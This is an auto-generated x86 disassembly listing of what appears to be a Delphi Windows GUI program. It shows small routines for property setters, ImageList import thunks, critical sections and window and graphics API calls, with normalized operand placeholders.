cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_42416d
mov eax [ ebp - 0xc ]
call sub_40316c
retn
sub_424176
jmp sub_4038c0
j_sub_42416d
jmp sub_42416d
sub_42417d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
sub_424193
jmp sub_4038c0
sub_4241a4
xor eax eax
retn
sub_4241a8
mov al [ eax + 0x21 ]
retn
sub_4241f4
jmp sub_4038c0
sub_4241fb
pop esi
pop ecx
pop ebp
retn
sub_424228
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_42427f
jmp sub_4038c0
sub_424286
pop esi
pop ecx
pop ebp
retn
sub_42428c
retn
sub_424290
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4242a0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_424425
jmp sub_4038c0
sub_42442c
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42454b
jmp sub_4038c0
sub_424552
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4245da
jmp sub_4038c0
sub_4245e1
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42473c
jmp sub_40360c
sub_42479c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424348
mov [ rw-data ] eax
sub_4247bc
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42464c
mov [ rw-data ] eax
sub_4248e4
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_424880
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_42498c
jmp sub_40360c
sub_424a23
jmp sub_40360c
sub_424a9c
push ebx
mov ebx edx
call sub_4247bc
mov edx ebx
call sub_424760
test eax eax
setne al
pop ebx
retn
sub_424acc
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4248e4
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_424c15
jmp sub_40360c
sub_424c93
jmp sub_4038c0
sub_424c9a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424e34
retn
sub_424fd4
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_4252d8
jmp sub_4038c0
sub_4252df
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425457
jmp sub_4038c0
sub_42545e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4254ed
jmp sub_4038c0
sub_4254f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425516
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
sub_42550f
jmp sub_4038c0
sub_425516
pop ebx
mov esp ebp
pop ebp
retn
sub_425529
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_425810
jmp r-xdata
retn
sub_42553f
call sub_42589c
retn
sub_425634
retn
sub_42588c
jmp sub_4038c0
sub_4259b7
jmp sub_4038c0
sub_4259be
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_4259d7
jmp sub_4038c0
sub_425bae
jmp sub_4038c0
sub_425bd6
jmp sub_4038c0
sub_425bdd
mov esp ebp
pop ebp
retn
sub_425c54
jmp sub_4038c0
sub_425d5c
jmp sub_4038c0
sub_425e47
jmp sub_4038c0
sub_425e54
inc [ eax + 0x4 ]
retn
sub_425fcf
jmp sub_4038c0
sub_426380
jmp sub_4038c0
sub_4265ca
jmp sub_4038c0
sub_4265f4
jmp sub_4038c0
sub_4265fb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42661d
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_426616
jmp sub_4038c0
sub_426627
jmp sub_40360c
sub_426676
jmp sub_4038c0
sub_4268a3
jmp sub_4038c0
sub_4268eb
jmp sub_4038c0
sub_426a58
jmp sub_4038c0
sub_426b1f
jmp sub_40360c
sub_426b74
mov [ eax + 0x31 ] 0x0
call sub_423fa0
retn
sub_426dc5
jmp sub_4038c0
sub_426e30
jmp sub_4038c0
sub_426e37
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426ea8
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_426f5c
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_426f6c
push ebx
mov ebx eax
mov eax ebx
call sub_427124
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_426f80
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_426f9c
push ebx
mov ebx eax
mov eax ebx
call sub_427184
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_426ff8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_427107
jmp sub_4038c0
sub_42736b
jmp sub_40360c
sub_4273cb
jmp sub_4038c0
sub_4273d2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_4277b3
jmp sub_4038c0
sub_4277df
jmp sub_4038c0
sub_427846
jmp sub_40360c
sub_427877
jmp sub_4038c0
sub_4278fc
jmp sub_40360c
sub_427901
mov eax [ ebp - 0x38 ]
call sub_40316c
call sub_403920
call sub_403974
sub_427913
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427930
mov eax [ ebp - 0x18 ]
call sub_4026fc
retn
sub_427929
jmp sub_4038c0
sub_427a7f
jmp sub_40360c
sub_427d4b
jmp sub_40360c
sub_427e2c
mov cl 0x1
call sub_427e34
retn
sub_4280e9
add [ eax ] al
add [ ebx ] dh
leave
call sub_427e34
retn
sub_42816e
jmp sub_40360c
sub_428173
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403920
call sub_403974
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4281c4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_4282fd
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42832c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_428340
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_428459
jmp sub_40360c
sub_42850e
jmp sub_40360c
sub_428578
jmp sub_40360c
sub_4285ac
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_428538
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_4285c4
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_422c98
retn
mov [ eax + 0x30 ] edx
retn
sub_4285dc
retn
sub_4285e0
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_422c98
retn
mov [ eax + 0x2c ] edx
retn
sub_428620
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_422c98
pop ebp
retn 0x4
sub_428634
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_422c98
pop ebp
retn 0x4
sub_4287f4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_428800
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4288ad
jmp sub_4038c0
sub_4288b4
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42899f
jmp sub_40360c
sub_428a0b
jmp sub_4038c0
sub_428b39
jmp sub_4038c0
sub_428b40
pop ebp
retn
sub_428c75
jmp sub_4038c0
sub_428c7c
pop ebp
retn
sub_428c80
sub [ rw-data ] 0x1
retn
sub_428ec8
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_417e94
retn
sub_428efc
mov eax [ eax + 0x4 ]
call sub_417d38
retn
sub_428f2d
jmp sub_4038c0
sub_428f34
pop ebp
retn
sub_428f38
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_12(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_GetBkColor) ]
ImageList_Replace
jmp [ ImageList_Replace@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_429029
jmp sub_4038c0
sub_429030
pop ebp
retn
sub_429034
sub [ rw-data ] 0x1
retn
sub_4290fb
jmp sub_4038c0
sub_429102
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429718
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_429124
mov [ rw-data ] sub_42923c
mov [ rw-data ] sub_4291ac
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_429440
mov [ rw-data ] sub_429514
mov [ rw-data ] sub_4295e8
retn
sub_4297a9
jmp sub_4038c0
sub_4297b0
pop ebp
retn
sub_4297b4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_429718
sub_4297e9
jmp sub_4038c0
sub_4297f0
pop ebp
retn
sub_4297f4
sub [ rw-data ] 0x1
retn
sub_429c36
jmp sub_4038c0
sub_429c3d
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_429e4d
jmp sub_4038c0
sub_429e54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a009
jmp sub_4038c0
sub_42a06e
jmp sub_4038c0
sub_42a075
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a161
jmp sub_4038c0
sub_42a168
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42a378
lea eax [ ebp - 0x30 ]
call sub_403f40
lea eax [ ebp - 0x20 ]
call sub_403f40
retn
sub_42a389
jmp sub_4038c0
j_sub_42a378
jmp sub_42a378
sub_42a390
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a48b
jmp sub_4038c0
sub_42a492
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a58f
jmp sub_4038c0
sub_42a596
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a5f6
lea eax [ ebp - 0x4 ]
call sub_4058d0
retn
sub_42a5ff
jmp sub_4038c0
j_sub_42a5f6
jmp sub_42a5f6
sub_42a606
pop ebx
pop ecx
pop ebp
retn
sub_42a6a1
jmp sub_4038c0
sub_42a6a8
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42a6b4
mov eax [ eax + 0x20 ]
retn
sub_42a7e3
jmp sub_4038c0
sub_42a7ea
pop ebp
retn
sub_42a7ec
sub [ rw-data ] 0x1
retn
sub_42a819
jmp sub_4038c0
sub_42a820
pop ebp
retn
sub_42a824
sub [ rw-data ] 0x1
retn
sub_42a85d
jmp sub_4038c0
sub_42a864
pop ebp
retn
sub_42a868
sub [ rw-data ] 0x1
retn
sub_42ab75
jmp sub_4038c0
sub_42ab7c
pop ebp
retn
sub_42ab80
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42a8cc
sub_42ac60
retn
sub_42acd4
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42ace0
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42acec
mov edx [ eax ]
call [ edx ]
retn
sub_42acf4
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42ad21
jmp sub_4038c0
sub_42ad28
pop ebp
retn
sub_42ad2c
sub [ rw-data ] 0x1
retn
sub_42aeeb
jmp sub_4038c0
sub_42aef2
pop ebp
retn
sub_42b2a7
jmp sub_4038c0
sub_42b2ae
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42b6c8
jmp sub_4038c0
sub_42b6cf
pop ebp
retn
sub_42b6d4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ac64
mov [ rw-data ] eax
sub_42b715
jmp sub_4038c0
sub_42b71c
pop ebp
retn
sub_42b720
sub [ rw-data ] 0x1
retn
sub_42b74d
jmp sub_4038c0
sub_42b754
pop ebp
retn
sub_42b758
sub [ rw-data ] 0x1
retn
sub_42b785
jmp sub_4038c0
sub_42b78c
pop ebp
retn
sub_42b790
sub [ rw-data ] 0x1
retn
sub_42b7bd
jmp sub_4038c0
sub_42b7c4
pop ebp
retn
sub_42b7c8
sub [ rw-data ] 0x1
retn
sub_42b7f5
jmp sub_4038c0
sub_42b7fc
pop ebp
retn
sub_42b800
sub [ rw-data ] 0x1
retn
sub_42b82d
jmp sub_4038c0
sub_42b834
pop ebp
retn
sub_42b838
sub [ rw-data ] 0x1
retn
sub_42b865
jmp sub_4038c0
sub_42b86c
pop ebp
retn
sub_42b870
sub [ rw-data ] 0x1
retn
sub_42b89d
jmp sub_4038c0
sub_42b8a4
pop ebp
retn
sub_42b8a8
sub [ rw-data ] 0x1
retn
sub_42b8d5
jmp sub_4038c0
sub_42b8dc
pop ebp
retn
sub_42b8e0
sub [ rw-data ] 0x1
retn
sub_42bb5a
jmp sub_40360c
sub_42bb5f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46040c
call sub_403974
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42bb7c
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42bb84
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403368
pop esi
retn
sub_42bb9c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403368
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42bbb4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42bc5d
jmp sub_4038c0
sub_42bc8b
jmp sub_4038c0
sub_42bc92
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bc9c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42bcb0
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42bf0e
jmp sub_4038c0
sub_42bf15
pop ebp
retn
sub_42ce8a
jmp sub_40360c
sub_42cf43
jmp sub_4038c0
sub_42cf4a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42cf50
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42cec4
sub_42cf60
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42cec4
sub_42cf70
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42cec4
pop ebp
retn 0x8
sub_42cf88
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42d044
mov ecx [ edx ]
sub [ eax ] ecx
mov ecx [ edx + 0x4 ]
sub [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
add [ eax + 0x8 ] ecx
mov edx [ edx + 0xc ]
add [ eax + 0xc ] edx
retn
sub_42d1a0
push ebx
mov ebx edx
mov edx ebx
call sub_443258
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_42dd1d
jmp sub_4038c0
sub_42e139
jmp sub_4038c0
sub_42e140
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e14c
cmp edx [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] edx
sub_42e15c
cmp dl [ eax + 0x234 ]
je r-xdata
retn
mov [ eax + 0x234 ] dl
sub_42e16c
retn
sub_42ea54
call sub_42ea64
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax ]
retn
sub_42eba3
jmp sub_4038c0
sub_42f064
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_42f0b4
xor edx edx
mov ecx [ eax + 0x22c ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_42f0d0
push esi
mov esi eax
mov eax [ esi + 0x22c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42f365
jmp sub_4038c0
sub_42f39d
jmp sub_4038c0
sub_42f78d
jmp sub_4038c0
sub_42f794
pop ebp
retn
sub_42f798
sub [ rw-data ] 0x1
retn
sub_42f870
jmp sub_4038c0
sub_42f877
pop ecx
pop ebp
retn
sub_42f87c
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_42f9b2
jmp sub_4038c0
sub_42f9b9
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42fa62
jmp sub_4038c0
sub_42fac8
jmp sub_4038c0
sub_42facf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fb2d
jmp sub_4038c0
sub_42fb34
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fc19
jmp sub_4038c0
sub_42fc20
pop ebx
mov esp ebp
pop ebp
retn
sub_42fc9d
jmp sub_4038c0
sub_42fca4
pop ebx
mov esp ebp
pop ebp
retn
sub_42fd42
jmp sub_40360c
sub_42fdd9
jmp sub_4038c0
sub_42fde0
pop ebp
retn
sub_42fde4
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42fe60
retn
sub_42fe61
jmp sub_4038c0
j_sub_42fe60
jmp sub_42fe60
sub_42fe68
pop ebp
retn
sub_42fe6c
sub [ rw-data ] 0x1
retn
sub_42ff6f
add [ eax + 0x480043ea ] ch
rol [ eax + eax + 0x5c ] 0xc0
inc esp
add al ah
0xc0840043 0x44
sub_4308b4
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_431037
jmp sub_4038c0
sub_431073
jmp sub_4038c0
sub_431c70
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f64
retn
sub_431c7e
jmp sub_4038c0
j_sub_431c70
jmp sub_431c70
sub_431c85
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431f0c
call sub_441120
retn
sub_431f14
push ebx
mov ebx eax
mov eax ebx
call sub_431f30
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_431f28
mov eax [ r-xdata ]
retn
sub_431f30
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_431f3c
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_430a24
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_431f54
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_431f8c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43203c
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_432058
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_431f94
sub_43206c
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_432088
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4320a8
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_432100
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_431f94
sub_432114
push esi
mov esi eax
mov eax esi
call sub_4412d0
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403368
sub_432261
jmp sub_4038c0
sub_432268
pop edi
pop esi
pop ecx
pop ebp
retn
sub_432270
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_432278
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_432280
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_4309b0
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_430ac4
pop esi
pop ebx
retn
sub_4324b0
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_40316c
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_432574
jmp sub_4038c0
sub_432580
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4324cc
call sub_403c90
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b80
sub_4325cd
jmp sub_4038c0
sub_4325d4
pop ebp
retn
sub_4325d8
sub [ rw-data ] 0x1
retn
sub_432634
jmp sub_4038c0
sub_43263b
pop ebp
retn
sub_432640
sub [ rw-data ] 0x1
retn
sub_43269c
jmp sub_4038c0
sub_4326a3
pop ebp
retn
sub_4326a8
sub [ rw-data ] 0x1
retn
sub_432709
jmp sub_4038c0
sub_432710
pop ebp
retn
sub_432714
sub [ rw-data ] 0x1
retn
sub_432760
jmp sub_4038c0
sub_432767
pop ebp
retn
sub_43276c
sub [ rw-data ] 0x1
retn
sub_432799
jmp sub_4038c0
sub_4327a0
pop ebp
retn
sub_4327a4
sub [ rw-data ] 0x1
retn
sub_43284c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c21c
mov [ rw-data ] eax
sub_432881
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_432898
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_43291b
jmp sub_4038c0
sub_432922
pop ebp
retn
sub_432924
sub [ rw-data ] 0x1
retn
sub_432993
jmp [ edi ]
sub_432c4c
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_432c90
push ebx
mov ebx eax
mov eax ebx
call sub_4334b4
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_4334a3
jmp sub_4038c0
sub_4334b4
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42b658
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_432c60
sub_43350b
jmp sub_4038c0
sub_433512
pop ebp
retn
sub_433514
sub [ rw-data ] 0x1
retn
sub_435a50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fbb0
pop esi
pop ebx
retn
sub_435bba
jmp sub_4038c0
sub_435bc1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435cd0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_441ca0
mov eax ebx
mov si 0xffc7
call sub_403368
pop esi
pop ebx
retn
sub_435dbc
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_435dd8
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403368
sub_435df4
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_435e00
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41e7a8
sub_435e14
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_435e74
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_435ee8
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403368
pop esi
pop ebx
retn
sub_435f04
push esi
mov esi eax
mov eax esi
call sub_4417ac
mov eax esi
mov si 0xffc7
call sub_403368
pop esi
retn
sub_435fa9
jmp sub_4038c0
sub_435fb0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435fb8
push ebx
mov ebx eax
mov eax ebx
call sub_441910
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_435fdc
push ebx
mov ebx eax
mov eax ebx
call sub_441928
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_4360c8
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_436654
sub_4360dc
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_436654
mov eax ebx
call sub_44396c
sub_436100
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_44396c
sub_436144
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_44396c
sub_4362dc
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_446450
push eax
call SetWindowTextA
pop ebx
retn
sub_4362f8
